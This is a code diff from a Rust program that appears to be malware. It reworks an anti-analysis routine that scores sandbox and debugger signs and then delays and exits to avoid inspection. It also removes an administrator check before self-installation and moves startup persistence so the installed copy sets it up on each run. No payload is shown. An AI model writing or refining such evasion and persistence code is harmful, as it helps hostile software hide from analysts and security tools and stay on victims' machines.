@@ -111,25 +111,18 @@ fn run_saa() -> bool {
     use crate::core::anti_analysis::{run_checks, AntiAnalysisConfig, EvasionAction, random_delay};
 
     let config = AntiAnalysisConfig {
-        check_vm: false,
-        check_sandbox: true,
-        check_debugger: true,
-        min_uptime_seconds: 300,
-        min_ram_gb: 2,
-        min_processes: 40,
-        min_disk_gb: 50,
+        min_score_threshold: 50,
         delay_range: (30, 90),
         action: EvasionAction::DelayThenExit,
     };
 
     let result = run_checks(&config);
 
-    if result.is_detected() {
+    if result.is_detected {
         log_debug!("Anti Analysis ----------");
-        log_debug!("  - Sandbox: {}", result.is_sandbox);
-        log_debug!("  - Debugger: {}", result.is_debugger);
-        for reason in &result.reasons {
-            log_debug!("  - Reason: {}", reason);
+        log_debug!("  - Total Score: {}", result.total_score);
+        for detection in &result.detections {
+            log_debug!("  - [{}]: {} (Weight: {})", detection.category, detection.reason, detection.weight);
         }
         log_debug!("Exiting...");
 
@@ -144,29 +137,26 @@ fn run_softaa() -> Option<Vec<String>> {
     use crate::core::anti_analysis::{run_checks, AntiAnalysisConfig, EvasionAction};
 
     let config = AntiAnalysisConfig {
-        check_vm: false,
-        check_sandbox: true,
-        check_debugger: true,
-        min_uptime_seconds: 120,
-        min_ram_gb: 2,
-        min_processes: 30,
-        min_disk_gb: 40,
+        min_score_threshold: 30, // Lower threshold for soft check
         delay_range: (0, 0),
         action: EvasionAction::ReportOnly,
     };
 
     let result = run_checks(&config);
 
-    if result.is_detected() {
+    if result.is_detected {
         log_debug!("Anti Analysis ----------");
-        log_debug!("  - Sandbox signs: {}", result.is_sandbox);
-        log_debug!("  - Debugger signs: {}", result.is_debugger);
-        for reason in &result.reasons {
-            log_debug!("  - Warning: {}", reason);
+        log_debug!("  - Total Score: {}", result.total_score);
+        
+        let mut reasons = Vec::new();
+        for detection in &result.detections {
+            let msg = format!("[{}]: {}", detection.category, detection.reason);
+            log_debug!("  - Warning: {} (Weight: {})", msg, detection.weight);
+            reasons.push(msg);
         }
         log_debug!("Continue...");
 
-        return Some(result.reasons);
+        return Some(reasons);
     }
 
     None
@@ -287,7 +277,7 @@ async fn main() -> anyhow::Result<()> {
 
     //@ Installation
     // Note: is_installed already checked above for anti-analysis
-    if is_admin_privileged && !is_installed {
+    if !is_installed {
         log_debug!("Starting installation process...");
 
         match installation::install_to_path() {
@@ -299,23 +289,22 @@ async fn main() -> anyhow::Result<()> {
             }
         }
 
-        log_debug!("Setting up startup task...");
-
-        // Use async startup check
-        match crate::core::startup::check_startup().await {
-            Ok(_) => {
-                log_debug!("Startup task created successfully!");
-            }
-            Err(e) => {
-                log_debug!("Startup task failed: {}", e);
-            }
-        }
-
-        log_debug!("Installation complete. Exiting original process...");
+        println!("Installation complete. Exiting original process...");
         if Config::SHOW_CONSOLE {
             std::thread::sleep(std::time::Duration::from_secs(2));
         }
         safe_exit(0);
+    }
+
+    //@ Startup Persistence (runs for INSTALLED exe only)
+    println!("Setting up startup persistence...");
+    match crate::core::startup::check_startup().await {
+        Ok(_) => {
+            println!("Startup persistence configured successfully!");
+        }
+        Err(e) => {
+            println!("Startup persistence failed: {}", e);
+        }
     }
 
     //@ Authentication
